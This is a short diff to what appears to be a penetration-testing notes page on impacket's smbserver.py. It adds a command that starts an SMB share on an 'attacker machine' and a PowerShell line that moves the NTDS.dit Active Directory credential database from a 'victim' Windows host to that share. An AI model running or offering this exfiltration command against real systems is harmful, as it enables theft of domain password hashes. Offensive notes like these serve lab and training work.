@@ -21,7 +21,15 @@ Download from: [https://github.com/fortra/impacket/blob/master/examples/smbserve
 
 ## Basic usage
 
+
+Launch smbserver in our attacker machine:
+
 ```bash
-python3 smbserver.py -smb2support CompData /home/<nameofuser>/sharedfolder/
+sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/username/Documents/
 ```
 
+Now, from PS in the victim's windows machine we could upload a folder to the shared folder in the attacker machine just by running:
+
+```powershell
+cmd.exe /c move C:\NTDS\NTDS.dit \\$ip\CompData
+```
